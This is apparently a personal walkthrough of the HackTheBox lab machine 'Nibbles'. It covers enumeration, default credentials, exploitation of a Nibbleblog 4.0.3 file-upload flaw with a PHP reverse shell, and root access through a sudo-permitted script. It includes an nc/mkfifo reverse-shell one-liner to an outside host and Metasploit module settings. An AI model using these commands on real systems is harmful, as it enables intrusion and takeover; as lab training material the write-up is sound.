---
title: Nibbles - A HackTheBox machine 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - reverse shell
  - CVE-2015-6967
---

# Nibbles - A Hack The Box machine


```shell-session
nmap -sC -sV -Pn 10.129.96.84 
```


Results:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the IP:80 in the browser and reviewing source code there is a comment:

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

So, we have a website at http://10.129.96.84/nibbleblog/

Dirb enumeration reveals a login panel: http://10.129.96.84/nibbleblog/admin.php

```shell-session
dirb http://10.129.96.84/nibbleblog/ /usr/share/wordlists/dirb/common.txt
```

Too many login attempts too quickly trigger a lockout with the message "Nibbleblog security error - Blacklist protection".

Also, dirb enumeration reveals some directories that are listable. Browsing around we get to this file: http://10.129.96.84/nibbleblog/content/private/users.xml where user "admin" is exposed.

Also CMS version is disclosed in http://10.129.96.84/nibbleblog/README:

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

A quick search for that version brings up this vulnerability:

https://github.com/dix0nym/CVE-2015-6967/blob/main/README.md

In the usage example we can read:

```
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
```

Default credentials are: 

```
admin:nibbles
```

Also, reading the code of the exploit, we can see that the triggered endpoint for this CVE-2015-6967 is:

```
uploadURL = f"{nibbleURL}admin.php?controller=plugins&action=config&plugin=my_image"
```

Knowing this, we can login into the panel http://10.129.96.84/nibbleblog/admin.php and go to Plugins>My Image> Configure.

In the browser, upload a file. In my case, I uploaded my [pentesmonkey](pentesmonkey.md).

Now, we need to find where this file has been saved to. After browsing around, I ended up in http://10.129.96.84/nibbleblog/content/private/plugins/my_image/

There there was a file called image.php. Before clicking on it, we open in our attacker machine a netcat listener:

```shell-session
nc -lnvp 1234
```

Click on the file image.php listed in http://10.129.96.84/nibbleblog/content/private/plugins/my_image/ and you will have a reverse shell.

Cat user.txt (under /home/nibbler).

### Privilege escalation

```shell-session
sudo -l
```

Results:

```
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

At /home/nibbler, unzip the file personal.zip. Now you can even replace monitor.sh for a different monitor.sh.
Mine has:

```
/bin/bash
```

Now run:

```shell-session
sudo -u root .home/nibbler/personal/stuff/monitor.sh
```

And you are root. Remember to do a chmod if needed.


## Some input from HTB walkthrough

You can run nmap script for nibbles service:

```shell-session
nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
```


For privilege escalation:

```shell-session
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```


Alternative way: 

```msf6-session
msf6 > search nibbleblog

msf6 > use exploit/multi/http/nibbleblog_file_upload

msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
rhosts => 10.129.42.190
msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 
lhost => 10.10.14.2
```

We need to set the admin username and password admin:nibbles and the TARGETURI to nibbleblog.